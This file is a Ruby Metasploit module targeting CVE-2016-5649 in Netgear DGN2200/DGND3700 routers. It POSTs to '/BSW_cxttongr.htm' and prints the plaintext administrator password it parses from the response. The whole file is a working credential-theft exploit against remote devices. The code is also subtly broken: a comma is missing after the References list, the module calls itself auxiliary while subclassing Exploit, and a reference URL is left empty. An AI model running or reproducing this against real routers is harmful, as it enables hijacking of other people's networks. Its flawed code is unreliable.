require 'msf/core'

class MetasploitModule < Msf::Exploit
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Netgear DGN2200 / DGND3700 "BSW_cxttongr.htm" plaintext password disclosure',
      'Description'     => %q{
        This auxilary module extracts administrator credentials from specific Netgear routers.
        Credentials are stored in plaintext format, accessable through WAN and LAN interfaces.
      },
      'Author'          =>
        [
          'RGFulw' #Module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          ['CVE', 'CVE-2016-5649'],
          ['URL', ''], # Demo
          ['EDB', '46764'] # Exploit-DB ID
        ]
      'DisclosureDate' => 'Apr 30 2019',
    ))

    register_options([
      OptString.new('RHOST', [ true, 'Remote host', '' ]),
      OptInt.new('RPORT', [ true, 'Remote port', 80 ]),
      OptString.new('URI', [ true, 'Path to POST to', '/BSW_cxttongr.htm' ])
    ])
  end

  def run
    print_status("Sending POST request to #{rhost}:#{rport}#{datastore['URI']}")
    begin
      res = send_request_raw({
        'uri'    => datastore['URI'],
        'method' => 'POST'
      })

      unless res && res.body
        print_error("No response or empty body from server.")
        return
      end

      res.body.each_line do |line|
        fields = line.split
        if fields.length >= 218
          field = fields[217]
          trimmed = field[1..-4] if field.length > 4
          print_line(trimmed) if trimmed
        end
      end

    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - Failed connecting to the web server.")
      return
    end
  end
end
